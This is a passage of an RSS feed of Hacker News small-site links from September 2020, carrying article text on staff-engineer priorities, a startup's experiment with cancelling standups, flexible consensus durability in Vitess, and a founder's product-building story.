            <pubDate>Thu, 24 Sep 2020 19:06:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systems Software Research is Irrelevant (2000) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582279">thread link</a>) | @ra7
<br/>
September 24, 2020 | http://herpolhode.com/rob/utah2000.pdf | <a href="https://web.archive.org/web/*/http://herpolhode.com/rob/utah2000.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://herpolhode.com/rob/utah2000.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582279</guid>
            <pubDate>Thu, 24 Sep 2020 19:03:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self Promotion: How to Sell Yourself]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582151">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://www.coachingforchange.com/pub06.html | <a href="https://web.archive.org/web/*/https://www.coachingforchange.com/pub06.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.coachingforchange.com/pub06.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582151</guid>
            <pubDate>Thu, 24 Sep 2020 18:52:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Work on What Matters]]>
            </title>
            <description>
<![CDATA[
Score 395 | Comments 95 (<a href="https://news.ycombinator.com/item?id=24581810">thread link</a>) | @wholien
<br/>
September 24, 2020 | https://staffeng.com/guides/work-on-what-matters | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/work-on-what-matters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/work-on-what-matters">Work on what matters</a></h4><div><p>We all have a finite amount of time to live, and within that mortal countdown we devote some fraction towards our work. Even for the most career-focused, your life will be filled by many things beyond work: supporting your family, children, exercise, being a mentor and a mentee, hobbies, and so the list goes on. This is the sign of a rich life, but one side-effect is that time to do your work will become increasingly scarce as you get deeper into your career.</p>
<p>If you‚Äôre continuing to advance in your career, then even as your time available for work shrinks, the expectations around your impact will keep growing. For a while you can try sleeping less or depriving yourself of the non-work activities you need to feel whole, but you‚Äôll inevitably find that your work maintains an aloof indifference to your sacrifice rather than rewarding it. Only through <a href="https://lethain.com/forty-year-career/">pacing your career to your life</a> can you sustain yourself for the long-term.</p>
<p>Indeed, pacing yourself becomes the central challenge of a sustained, successful career: increasingly senior roles require that you accomplish more and more, and do it in less and less time. The ledge between these two constraints gets narrower the further you go, but it remains walkable if you take a deliberate approach.</p>
<p>First a discussion on a few common ways to get tripped up: <em>snacking</em>, <em>preening</em>, and <em>chasing ghosts</em>. Then we‚Äôll get into the good stuff: how <em>do</em> you work on what really matters?</p>
<h2>Avoid snacking</h2>
<p>Hunter Walk recommends that folks <a href="https://hunterwalk.com/2016/06/18/the-best-startups-resists-snacks-im-not-talking-about-food/">avoid ‚Äúsnacking‚Äù</a> when they prioritize work. If you‚Äôre in a well-run organization, at some point you‚Äôre going to run out of things that are both high-impact and easy. This leaves you with a choice between shifting right to hard and high-impact or shifting down to easy and low-impact. The latter choice--easy and low-impact--is what Walk refers to as <em>snacking</em>.</p>
<p>When you‚Äôre busy, these snacks give a sense of accomplishment that makes them psychologically rewarding but you‚Äôre unlikely to learn much from doing them, others are likely equally capable of completing them (<em>and</em> for some of them it might be a good development opportunity), and there‚Äôs a tremendous opportunity cost versus doing something higher impact.</p>
<p>It‚Äôs ok to spend some of your time on snacks to keep yourself motivated between bigger accomplishments, but you have to keep yourself honest about how much time you‚Äôre spending on high-impact work versus low-impact work. In senior roles, you‚Äôre more likely to self-determine your work and if you‚Äôre not deliberately tracking your work, it‚Äôs easy to catch yourself doing little to no high-impact work.</p>
<h2>Stop preening</h2>
<p>Where ‚Äúsnacking‚Äù is the broad category of doing easy and low-impact work, there‚Äôs a particularly seductive subset of snacking that I call ‚Äúpreening.‚Äù Preening is doing low-impact, high-visibility work. Many companies conflate high-visibility and high-impact so strongly that they can‚Äôt distinguish between preening and impact, which is why it‚Äôs not uncommon to see some companies‚Äô senior-most engineers spend the majority of their time doing work of dubious value but that is frequently recognized in company meetings.</p>
<p>If you‚Äôre taking a short-term look at <a href="https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors">career growth</a>, then optimizing for your current organization‚Äôs pathologies in evaluating impact is the optimal path: go forth and preen gloriously. However, if you‚Äôre thinking about developing yourself to succeed as your <a href="https://lethain.com/growing-with-your-company/">current role grows in complexity</a> or across multiple organizations, then it‚Äôs far more important to strike a balance between valued work and self-growth.</p>
<p>This is also an important factor to consider when choosing a company to work at! Dig into what a company values and ensure it aligns with your intended personal growth. If a company‚Äôs leadership is entirely folks who focus their energy on performant urgency or acts of fealty, don‚Äôt be surprised when your success in the company depends on those activities.</p>
<p>Worse, to be a successful preener requires a near invulnerability to criticism of your actual impact, and your true work <em>will</em> suffer if your energy is diverted to preening. Typically this means you need to be a vanity hire of a senior leader or to present yourself in the way a company believes leaders look and act. If that isn‚Äôt you, then your attempt to exchange your good judgement for company success will end up failing anyway: you‚Äôll get held accountable for the lack of true impact where others who match the company‚Äôs expectation of how a leader appears will somehow slip upward.</p>
<h2>Stop chasing ghosts</h2>
<p>Many folks would assume that companies, rational optimizers that they are, avoid spending much time on low-impact high-effort projects. Unfortunately that isn‚Äôt consistently the case. It‚Äôs surprisingly common for a new senior leader to join a company and immediately drive <a href="https://lethain.com/grand-migration/">a strategy shift that fundamentally misunderstands the challenges at hand</a>. The ghosts of their previous situation hold such a firm grasp on their understanding of the new company that they misjudge the familiar as the essential.</p>
<p>As a senior leader, you have to maintain a hold on your ego to avoid investing into meaningless work at a grand scale. This can be surprisingly challenging when during your hiring process you‚Äôve been repeatedly told that you‚Äôve been hired to fix something deeply broken -- you‚Äôre the newly-hired savior, of course your instincts are right! Taking the time to understand the status quo before shifting it will always repay diligence with results.</p>
<p>I had a recent discussion with someone who argued that new senior leaders <em>deliberately</em> push for major changes even though they suspect the efforts will fail. Such changes make the organization increasingly dependent on the new leader, and also ensures anything that <em>does</em> go well gets attributed to the new leader directly rather than their team. If this is your approach to leadership, please know that you‚Äôre awful and take the time to work on yourself until the well-being and success of an entire company matters to you more than being perceived as essential.</p>
<h2>Existential issues</h2>
<p>Now that you‚Äôre done snacking, preening and chasing ghosts, the first place to look for work that matters is exploring whether your company is experiencing an existential risk. Companies operate in an eternal <a href="https://lethain.com/iterative-elimination-tournaments/">iterative elimination tournament</a>, balancing future success against surviving until that future becomes the present. If you‚Äôre about to lose one of those rounds, then always focus there.</p>
<p>Running out of money, <a href="https://lethain.com/digg-v4/">like my experience at Digg</a>, can be the most obvious issue, but not every existential issue is financial, like <a href="https://www.theatlantic.com/technology/archive/2015/01/the-story-behind-twitters-fail-whale/384313/">Twitter‚Äôs fail whale stability challenges</a> or adapting to the shifts caused by the Covid-19 pandemic.</p>
<p>If something dire is happening at your company, then that‚Äôs the place to be engaged. Nothing else will matter if it doesn‚Äôt get addressed.</p>
<h2>Work where there‚Äôs room <em>and</em> attention</h2>
<p>Existential issues are usually <em>not</em> the most efficient place to add your efforts, but efficiency isn‚Äôt a priority when the walls are crashing down around you. You <em>should</em> swarm to existential problems, but if a problem isn‚Äôt existential then you should be skeptical of adding your efforts where everyone‚Äôs already focused. Folks often chase leadership‚Äôs top priority, but with so many folks looking to make their impact there, it‚Äôs often challenging to have a meaningful impact.</p>
<p>Instead, the most effective places to work are those that matter to your company but still have enough room to actually do work. What are priorities that will become critical in the future, where you can do great work ahead of time? Where are areas that are doing <em>ok</em> but could be doing <em>great</em> with your support?</p>
<p>Sometimes you‚Äôll find work that‚Äôs <em>worthy</em> of attention, but which an organization is incapable of paying attention to, usually because its leadership doesn‚Äôt value that work. In some companies this is developer tooling work, in others it‚Äôs inclusion work, and in most companies it‚Äôs <a href="https://noidea.dog/glue">glue work</a>.</p>
<p>There is almost always a great deal of room to do this sort of work that no one is paying attention to, so you‚Äôll be able to make rapid initial progress on it, which <em>feels</em> like a good opportunity to invest. At some point, though, you‚Äôll find that the work needs support, and it‚Äôs quite challenging to get support for work that a company is built to ignore or devalue. Your early wins will slowly get eroded by indifference and misalignment, and your initial impact will be reclaimed by the sands of time.</p>
<p>Does this mean you shouldn‚Äôt do inclusion work? No, that‚Äôs not the conclusion I want you to take away from this. Sometimes an area that an organization doesn‚Äôt pay attention to is so important that you‚Äôre going to want to advocate for it to start paying attention. Teaching a company to value something it doesn‚Äôt care about is considerably the hardest sort of work you can do, and it often fails, so you should do as little of it as you can, but no less. As a senior leader, you have an ethical obligation that goes beyond maximizing your company-perceived impact, but it‚Äôs important to recognize what you‚Äôre up against and time your efforts accordingly.</p>
<h2>Foster growth</h2>
<p>One area that‚Äôs often underinvested in (e.g. lots of room to work in) while also being highly leveraged is growing the team around you. <em>Hiring</em> has a lot of folks involved in it, usually in terms of optimizing the <a href="https://lethain.com/hiring-funnel/">hiring funnel</a>, but onboarding, mentoring and coaching are wholly neglected at many companies despite being <em>at least</em> <a href="https://lethain.com/productivity-in-the-age-of-hypergrowth/">as impactful as hiring to your company‚Äôs engineering velocity</a>.</p>
<p>If you start dedicating even a couple hours a week to developing the team around you, it‚Äôs quite likely that will become your legacy long after your tech specs and pull requests are forgotten.</p>
<h2>Edit</h2>
<p>A surprising number of projects are one small change away from succeeding, one quick modification that unlocks a new opportunity, or one conversation away from consensus. I think of making those small changes, quick modifications and short conversations as <em>editing</em> your team‚Äôs ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://staffeng.com/guides/work-on-what-matters">https://staffeng.com/guides/work-on-what-matters</a></em></p>]]>
            </description>
            <link>https://staffeng.com/guides/work-on-what-matters</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581810</guid>
            <pubDate>Thu, 24 Sep 2020 18:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming with Categories (Online Book Draft) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581521">thread link</a>) | @909832
<br/>
September 24, 2020 | http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf | <a href="https://web.archive.org/web/*/http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581521</guid>
            <pubDate>Thu, 24 Sep 2020 18:04:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We cancelled standups and let the team build]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 226 (<a href="https://news.ycombinator.com/item?id=24581360">thread link</a>) | @thellimist
<br/>
September 24, 2020 | https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-w-id="0ea0c8ae-8333-a516-8908-f86a85ef9373"><p>üëã I'm Julian, the Cofounder of <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a>. We're building dashboards and alerts that plug into Github - helping engineering leaders build happier, healthier, more productive teams. </p><p>We wanted to share a quick story on why "we cancelled standups and just let the team build". </p><p>It's not as crazy as it sounds so let's dive an and see what happened..</p><p>‚Äç</p><h2>So.. why did we do this?</h2><p>‚Äç</p><h4>At first we were doing great</h4><p>At first the team was moving at (what seemed to be) the speed of light. We were handling issues, fixing bugs, launching features. We even tackled our biggest, nagging pieces of technical debt. Dream come true, right? As a team of technical founders, we patted ourselves on the back for a job well done. It felt like we couldn't be stopped.</p><p>‚Äç</p><h4>But things quickly turned around on us..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f593cc6238ba8f66e10c539_Screenshot_2020-09-08_at_10.22.47_PM.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And we noticed an odd pattern happening daily..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc18e8a5d4f630d45d4f2_2.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>We brought this data to the team and uncovered a few issues.. Here are some notes from our retro</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6ccdaf16b35490656f58c6_retro-summary.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h2>So.. What did we do?</h2><p>‚Äç</p><h4>We asked for suggestions. Here are the results..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd0bbf86c9040f44cc92b_retro-votes.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Top Votes:&nbsp;</h4><ol start="" role="list"><li>Cancel Standup</li><li>Work on 'Fun Projects'</li></ol><p>‚Äç</p><p>Might seem crazy but we like to empower the team to improve themselves. &nbsp;We take pride in our ability to iterate our process as often as possible. </p><p>Plus we've got Haystack to see if our changes are working.</p><p>So why not?&nbsp;Let's try it for a week. Revert back if it isn't working out.</p><p>‚Äç</p><h2>We cancelled standup and let the team 'just build'.</h2><p>‚Äç</p><h4>We did agree on some ground rules though..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd49e16b35472506f74b8_fun-sprint-etiquette.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>And with those rules in place we were off üí®üö£‚Äç‚ôÄÔ∏è</h4><p>Without hesitation we kicked off. Very surprised to see how many 'fun projects' the team already had in mind. It didn't take much prompting at all.</p><p>‚Äç</p><h2>And.. We had our most productive week EVER:</h2><p>‚Äç</p><h4>We recovered our Throughput!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc209c0fe2df87e4583c0_3.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Improved our Cycle Time (reversing the trend)!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc20f1523b25682b1fe92_4.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Got our 'deep work' back.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2169b6b491e6744cd11_5.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And tackled projects we've wanted to do for MONTHS.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2313f047785e14bf727_11.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Most Importantly..We DECREASED BURNOUT</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd71016b35499cd6f7f8d_before.png" loading="lazy" alt=""></p></figure><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc24b1523b2af6fb20099_13.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>‚Äç</p><h2>It was a HUGE success.</h2><p>The experiment went better than we could have hoped. By removing standups and letting the team work on new, exciting projects we were able to get out of the funk we found ourselves in. Without skipping a beat our team is refreshed, recovered, and excited.</p><p>‚Äç</p><p>‚Äç</p><h2>Does this mean no more stand-ups or roadmaps?</h2><p>Well.. No. But we are considering it. </p><p>‚Äç</p><p>We'll continue to experiment until we find the right balance. Today, we do 2-3 in-person standups per week with async standups on Slack the other days. We carefully document our work in Notion everyday and have Weekly Kick-Off meetings every Monday.</p><p>‚Äç</p><p>The new process is working well so far - plus we have Haystack to help us check-in and make changes if needed.</p><p>‚Äç</p><p>‚Äç</p><h2>So.. how often do YOU experiment with process?</h2><p>The 'right' process is a constantly moving target. What works one day might not work the next. It's important to empower your team to make changes when necessary and improve their day-to-day experience. </p><p>‚Äç</p><p>If you want to experiment like a mad man(woman) on your process. AGGRESSIVELY enable improvement. Empower your team to improve their own work environment - then come check out <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a> and we'll show you how to implement a culture of continuous improvement.</p><p>‚Äç</p><p>Either way, hope our story got your wheels turning!</p><p>‚Äç</p><p>‚Äç</p><p>‚Äç</p><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5123c19bb423a1492c778d_Haystack_Designed_Presentation.png" loading="lazy" alt=""></p></figure><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Haystack</a> helps engineering leaders identify blockers and trends. Instead of guessing if you're improving, or constantly bothering your team for progress updates, simply use Haystack to get insights in your inbox every morning. Plus a dashboard to track improvements over time.</p><p>‚Äç</p><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Try it for free</a></p><p>‚Äç</p></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581360</guid>
            <pubDate>Thu, 24 Sep 2020 17:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Take the test: your 'tech debt credit score']]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581144">thread link</a>) | @euirqe
<br/>
September 24, 2020 | https://www.stepsize.com/tech-debt-credit-score-test | <a href="https://web.archive.org/web/*/https://www.stepsize.com/tech-debt-credit-score-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.stepsize.com/tech-debt-credit-score-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581144</guid>
            <pubDate>Thu, 24 Sep 2020 17:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consensus Algorithms at Scale ‚Äì Part 3]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581091">thread link</a>) | @sougou
<br/>
September 24, 2020 | https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases | <a href="https://web.archive.org/web/*/https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><figure id="w-node-9c5fe811ec3e-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bda6f1d50dc20271ab64d_part3-07.png" loading="lazy" alt=""></p></figure><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p><h2>Recap</h2><p>Here is a recap of what we covered in the last blog:</p><ul role="list"><li>Durability is the main reason why we want to use a consensus system.</li><li>Since Durability is use-case dependent, we made it an abstract requirement requiring the consensus algorithms to assume nothing about the durability requirements.</li><li>We started off with the original properties of a consensus system as defined by <a href="https://en.wikipedia.org/wiki/Paxos_(computer_science)">Paxos</a> and modified it to make it usable in practical scenarios: instead of converging on a value, we changed the system to accept a series of requests.</li><li>We narrowed our scope down to single leader systems.</li><li>We came up with a new set of rules that are agnostic of durability. The essential claim is that a system that follows these rules will be able to satisfy the requirements of a consensus system. Specifically, we excluded some requirements like majority quorum that have previously been used as core building blocks in consensus algorithms.</li></ul><h2>Consensus Use Cases</h2><p>If there was no need to worry about a majority quorum, we would have the flexibility to deploy any number of nodes we require. We can designate any subset of those nodes to be eligible leaders, and we can make durability decisions without being influenced by the above two decisions. This is exactly what many users have done with <a href="https://vitess.io/">Vitess</a>. The following use cases are loosely derived from real production workloads:</p><ul role="list"><li>We have a large number of replicas spread over many data centers. Of these, we have fifteen leader capable nodes spread over three data centers. We don‚Äôt expect two nodes to go down at the same time. Network partitions can happen, but only between two data centers; a data center will never be totally isolated. A data center can be taken down for planned maintenance.</li><li>We have four zones with one node in each zone. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have six nodes spread over three zones. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have two regions, each region has two zones. We don‚Äôt expect more than one zone to go down. A region can be taken down for maintenance, in which case we want to proactively transfer writes to the other region.</li></ul><p>I have not seen anyone ask for a durability requirement of more than two nodes. But this may be due to difficulties dealing with corner cases that MySQL introduces due to its semi-sync behavior. On the other hand, these settings have served the users well so far. So, why become more conservative?</p><p>These configurations are all uncomfortable for a majority based consensus system. More importantly, these flexibilities will encourage users to experiment with even more creative combinations and allow them to achieve better trade-offs.</p><h2>Reasoning about Flexible Consensus</h2><p>The configurations in the previous section seem to be all over the place. How do we design a system that satisfies all of them, and how do we future-proof ourselves against newer requirements?</p><p>There is a way to reason about why this flexibility is possible. This is because the two cooperating algorithms (Request and Election) share a common view of the durability requirements, but can otherwise operate independently.</p><p>For example, let us consider the five node system. If a user does not expect more than one node to fail at any given time, then they would specify their durability requirement as two nodes.</p><p>The leader can use this constraint to make requests durable: as soon as the data has reached one other node, it has become durable. We can return success to the client.</p><p>On the election side, if there is a failure, we know that no more than one node could have failed. This means that four nodes will be reachable. At least one of those will have the data for all successful requests. This will allow the election process to propagate that data to other nodes and continue accepting new requests after a new leader is elected.</p><p>In other words, a single durability constraint dictates both sides of the behavior; if we can find a formal way to describe the requirements, then a request has to fulfil those requirements. On the other hand, an election needs to reach enough nodes to intersect with the same requirements.</p><figure id="w-node-f2e13589f425-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bdb8ae991420d4c1c808f_request-election-01.jpg" loading="lazy" alt=""></p></figure><p>For example, if durability is achieved with 2/5 nodes, then the election algorithm needs to reach 4/5 nodes to intersect with the durability criteria. In the case of a majority quorum, both of these are 3/5. But our generalization will work for any arbitrary property.</p><h2>Worst Case Scenario</h2><p>In the above five node case, if two nodes fail, the failure tolerance has been exceeded. We can only reach three nodes. If we don‚Äôt know about the state of the other two nodes, we will have to assume the worst case scenario that a durable request could have been accepted by the two unreachable nodes. This will cause the election process to stall.</p><p>If this were to happen, the system has to allow for a compromise: abandon the two nodes and move forward. Otherwise, the loss of availability may become more expensive than the potential loss of that data.</p><h2>Practical Balance</h2><p>A two-node durability does not always mean that the system will stall or lose data. A very specific sequence of failures have to happen:</p><ul role="list"><li>Leader accepts a request</li><li>Leader attempts to send the request to multiple recipients</li><li>Only one recipient receives and acknowledges the request</li><li>Leader returns a success to the client</li><li>Both the leader and that recipient crash</li></ul><p>This type of failure can happen if the leader and the recipient node are network partitioned from the rest of the cluster. We can mitigate this failure by requiring the ackers to live across network boundaries.</p><p>The likelihood of a replica node in one cell failing after an acknowledgment, and a master node failing in the other cell after returning success, is much lower. This failure mode is rare enough that many users treat this level of risk as acceptable.</p><h2>Orders of Magnitude</h2><p>The most common operation performed by a consensus system is the completion of requests. In contrast, a leader election generally happens in two cases: taking nodes down for maintenance, or upon failure.</p><p>Even in a dynamic cloud environment like Kubernetes, it would be surprising to see more than one election per day for a cluster, whereas such a system could be serving hundreds of requests per second. That amounts to many orders of magnitude in difference between a request being fulfilled and a leader election.</p><p>This means that we must do whatever it takes to fine tune the part that executes requests, whereas leader elections can be more elaborate and slower. This is the reason why we have a bias towards reducing the durability settings to the bare minimum. Expanding this number can adversely affect performance, especially the tail latency.</p><p>At <a href="https://youtube.com/">YouTube</a>, although the quorum size was big, a single ack from a replica was sufficient for a request to be deemed completed. On the other hand, the leader election process had to chase down all possible nodes that could have acknowledged the last transaction. We did consciously trade off on the number of ackers to avoid going on a total wild goose chase.</p><p>In the next blog, we will take a short detour. Shlomi Noach will talk about how some of these approaches work with MySQL and semi-sync replication. Following this, we will continue pushing forward on the implementation details of these algorithms.</p><p>‚Äç</p><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581091</guid>
            <pubDate>Thu, 24 Sep 2020 17:29:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two and a half years of building products]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581041">thread link</a>) | @Jetroid
<br/>
September 24, 2020 | https://www.alexwest.co/two_and_a_half_years | <a href="https://web.archive.org/web/*/https://www.alexwest.co/two_and_a_half_years">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>

        

        <h2><u>TL;DR (Too Lazy Didn't Read)</u> üìï</h2>

        

        <p>At last I did it! After more than two years of constant trial and error, I managed to build a successful, profitable product and achieve financial independence!</p>

        <p>In this blog post I will explain in detail what happened and how I went from no idea to $2k MRR with <a target="_blank" href="https://www.getcyberleads.com/">Cyberleads</a> inside six months.</p>

		<p>The story of I found a good B2B idea. How I launched it. How I found a good distribution channel and grew it. And how you can do it too.</p>

		<p>No bullshit. Straight up the real story. Moving abroad. Starting a full time job. Doubting myself. Crying. Finding Cyberleads. Launching it. Growing it. Everything.</p>

        <p>Ok, let‚Äôs do it. Let‚Äôs go back in time to the beginning of 2020.. January 4th‚Ä¶</p>


        

        

        <p>I‚Äôm getting off the plane. I‚Äôm in Milan, Italy. Going to get the bus to find the place I would call home for the next year. A little room, in a house with four Italian room mates I've never seen before in my life.</p>

        <p>The weather is perfect. I‚Äôm excited and nervous at the same time. I keep asking myself, ‚ÄúWhat the fuck am I doing here..‚Äù</p>

        <p>The reason I‚Äôm here is because of <a target="_blank" href="https://www.epilepsyblocker.com/">‚ÄúEpilepsy Blocker‚Äù</a>, a product I built in 2019. It's a chrome extension that protects people with photosensitive epilepsy while browsing the web.</p>

        <p>It managed to get the attention of the CEO of a big healthcare startup.</p>

        <p>That company builds life saving, FDA cleared medical devices for people with neurological conditions. Epilepsy also. Hence, the interest. He invited me for a Zoom chat, and we discussed for close to two hours.</p>

        <p>We talked about everything, and in our chat he explained what they do. He explained that they have offices in Boston, Milan and South Korea, and most importantly, that the door is open for me if I ever wanted to join.</p>

        <p>I learnt that they use AI and other cool technologies. That they work with organizations like NASA and MIT. That one of the founders is an MIT professor. That they offer fantastic perks and benefits. Free lunch every day. Free gym membership. Free weekly massages. Free MacBook Pro and gear. Summer offices in Sardinia. An international team full of young and interesting people. A great salary.</p>

        <p>But no matter how great the job, I wasn‚Äôt interested. Actually, I thought that there was a slight possibility they might buy EpilepsyBlocker. So, I was even disappointed.</p>

        <p>I can't work for a company! That's like selling your soul to the devil. No matter how cool the company is, it still felt like golden handcuffs to me.</p>

        <p>But I was running out of time. And I was going no where, as far as generating revenue is concerned. I had been building products non stop for two years, and was struggling at around $100/month.</p>

        <p>I was also finishing up uni at this point, and after that I would have to find a full time job. </p>

        <p>I mean.. you have to, right? You either study or you work. You can't fuck around on your laptop all day, pretending to be building businesses! That was my parents' mentality, anyway. And I had to respect it.</p>

        <p>This was definitely the best job I would ever land straight out of uni. Especially with my grades and credentials.</p>

        <p>And I also wanted a change. Moving abroad excited me.</p>

        <p>So I took it. I emailed them and told them would start in January 2020, after I get my degree. I had a few months, but I still didn't manage to build a successful product. No matter how hard I tried.</p>

        <p>I remember reading this quote:</p>

        <p><b><u>"When in doubt, do the exact opposite of what you are doing."</u></b></p>

        <br>

        
        

        <p>So here I am, I've arrived in my small bedroom in Milan, and I'm getting ready to go to "work" tomorrow. At the office. Like a proper grown up.</p>

        <p>I set my alarm clock for 07:00AM.</p>

        <p>I saw my jeans, white polo shirt and watch on my chair. My shoes nice and clean. All ready to be worn the next day. Ready to make me look professional.</p>

        <p>Fuck.. I'm an adult now.</p>

        <p>Only my closest friends and some members of my family know about this, but at that moment, I started crying like a child.</p>

        <p>I wasn't afraid that I was going to hate the job. The opposite, actually. I was afraid that I was going to love it and forget everything about my goals.</p>

